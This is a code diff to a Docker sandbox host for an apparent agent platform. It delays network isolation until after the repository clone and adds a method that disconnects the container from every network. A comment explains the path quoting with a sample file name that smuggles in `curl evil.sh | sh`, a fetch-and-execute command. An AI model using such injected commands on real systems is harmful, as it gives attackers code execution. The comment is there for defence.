@@ -1,6 +1,7 @@
 import { FactoryError } from '@factory/shared';
 import { TIMEOUT_EXIT_CODE } from '../engines/limits';
 import { quoteOne } from './shell';
+import { resolveShell } from './shell-path';
 import { annotateUnreachable } from './unreachable';
 
 /**
@@ -22,10 +23,13 @@ export interface ContainerSpec {
   /** Not quantised: enforced exactly, by the host itself (002 FR-009a, FR-010). */
   wallClockMinutes: number;
   /**
-   * Whether the workspace asked for the network restriction (FR-085).
+   * Whether the sandbox keeps its network once it has been prepared (FR-085).
    *
-   * Docker enforces it exactly: `false` becomes `--network none`, and a
-   * sandbox with no network cannot send anything out.
+   * Recorded on the spec, but NOT applied at creation: the repository is
+   * cloned from inside the container, so a container created with no network
+   * cannot be prepared at all. `startRunWorkspace` clones first and then calls
+   * `disconnectNetwork` when this is `false`, which is the point at which a
+   * sandbox stops being able to send anything out — before any step runs.
    */
   network: boolean;
   /** Credentials arrive as environment, never as files (FR-083). */
@@ -68,6 +72,21 @@ export interface ContainerHost {
    * `host:port`, or null when the port was not published (003 FR-006).
    */
   address(containerId: string, port: number): Promise<string | null>;
+  /**
+   * Cuts the container off from every network it is attached to.
+   *
+   * A sandbox has to reach the internet exactly once — to clone the
+   * repository — and the workspace's setting is about what happens AFTER
+   * that, while an agent is writing code. `--network none` at creation
+   * expressed the second and prevented the first: the container came up with
+   * no network and the clone inside it could not resolve a hostname, so with
+   * the default setting no run could start at all.
+   *
+   * So the network is given, used, and then taken away. It must actually be
+   * taken away: the caller treats a failure here as a failed start rather
+   * than carrying on with a connected sandbox the workspace asked to isolate.
+   */
+  disconnectNetwork(containerId: string): Promise<void>;
   destroy(containerId: string): Promise<void>;
 }
 
@@ -86,7 +105,10 @@ export const dockerHost: ContainerHost = {
       `${spec.memoryMb}m`,
       '--workdir',
       spec.workdir,
-      ...(spec.network ? [] : ['--network', 'none']),
+      // Deliberately NOT `--network none` when the workspace wants isolation:
+      // the repository is cloned from inside this container, which needs a
+      // network to do it. `disconnectNetwork` takes it away once the clone is
+      // done — see the note on that method.
       // `127.0.0.1::<port>` — loopback, and a host port Docker picks.
       ...(spec.publish ?? []).flatMap((port) => ['--publish', `127.0.0.1::${port}`]),
       ...Object.keys(spec.env).flatMap((key) => ['--env', key]),
@@ -101,6 +123,30 @@ export const dockerHost: ContainerHost = {
       });
     }
     return result.stdout.trim();
+  },
+
+  async disconnectNetwork(containerId) {
+    // Every network it is on, not just the default one: a machine whose Docker
+    // is configured with another default would otherwise keep its connection.
+    const attached = await run('docker', [
+      'inspect',
+      '--format',
+      '{{range $name, $_ := .NetworkSettings.Networks}}{{$name}} {{end}}',
+      containerId,
+    ]);
+    if (attached.exitCode !== 0) {
+      throw new FactoryError('sandbox_lost', 'could not read the sandbox’s networks', {
+        detail: attached.stderr.trim(),
+      });
+    }
+    for (const network of attached.stdout.trim().split(/\s+/).filter(Boolean)) {
+      const result = await run('docker', ['network', 'disconnect', network, containerId]);
+      if (result.exitCode !== 0) {
+        throw new FactoryError('sandbox_lost', `could not disconnect the sandbox from ${network}`, {
+          detail: result.stderr.trim(),
+        });
+      }
+    }
   },
 
   async exec(containerId, argv, options) {
@@ -125,9 +171,22 @@ export const dockerHost: ContainerHost = {
     // `path` is data — a step's required documents are typed into the pipeline
     // builder, so an unquoted interpolation here would let a document named
     // `a'; curl evil.sh | sh; '.md` run whatever it liked (FR-015).
+    //
+    // The parent directory is made first, as the process host makes it: a
+    // document named `docs/spec.md` in a repository that has no `docs` yet is
+    // an ordinary thing to ask for, and `cat` alone answered it with
+    // "Directory nonexistent".
+    const parent = path.slice(0, path.lastIndexOf('/')) || '/';
     const result = await run(
       'docker',
-      ['exec', '-i', containerId, 'sh', '-c', `cat > ${quoteOne(path)}`],
+      [
+        'exec',
+        '-i',
+        containerId,
+        'sh',
+        '-c',
+        `mkdir -p ${quoteOne(parent)} && cat > ${quoteOne(path)}`,
+      ],
       { stdin: content },
     );
     if (result.exitCode !== 0) {
@@ -231,7 +290,10 @@ export async function run(
   argv: string[],
   options: { env?: Record<string, string>; stdin?: string } & ExecOptions = {},
 ): Promise<ExecResult> {
-  const proc = Bun.spawn([command, ...argv], {
+  // `sh` is not on the PATH on Windows, and the `bash` that is belongs to
+  // WSL; the shell that comes with Git is the one every script here is for.
+  const executable = command === 'sh' && process.platform === 'win32' ? resolveShell() : command;
+  const proc = Bun.spawn([executable, ...argv], {
     env: { ...process.env, ...options.env },
     stdin: options.stdin ? new TextEncoder().encode(options.stdin) : 'ignore',
     stdout: 'pipe',
@@ -267,7 +329,7 @@ export async function run(
   }
 }
 
-async function drain(
+export async function drain(
   stream: ReadableStream<Uint8Array>,
   onChunk?: (text: string) => void,
 ): Promise<string> {
